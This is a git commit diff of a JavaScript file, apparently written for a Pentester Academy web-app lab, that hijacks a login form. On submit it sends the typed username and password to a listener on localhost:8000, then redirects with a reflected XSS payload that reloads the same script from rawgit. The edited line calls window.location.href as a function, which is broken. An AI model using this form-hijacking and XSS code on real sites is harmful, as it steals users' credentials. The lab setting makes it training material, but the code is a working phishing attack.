d8135f954cd0349ac57484368d734c55fe3d4c55
Charles Harner <charner93@gmail.com>
2018-01-22 08:28:46 -0600

    Update JFP.js

--- JFP.js
+++ JFP.js
@@ -7,6 +7,6 @@ function onFormSubmit()
 	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true);
 	request.send();
 	xss = '&url=<script src%3D\"https%3A%2F%2Frawgit.com%2Fcharner93%2Fscripts%2Fmaster%2FJFP.js\"><%2Fscript>';
-	window.location.replace("http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?email=" + usernameForm + "&password=" + passwordForm + xss);
+	window.location.href("http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?email=" + usernameForm + "&password=" + passwordForm + xss);
 }
 document.forms[0].onsubmit = onFormSubmit;
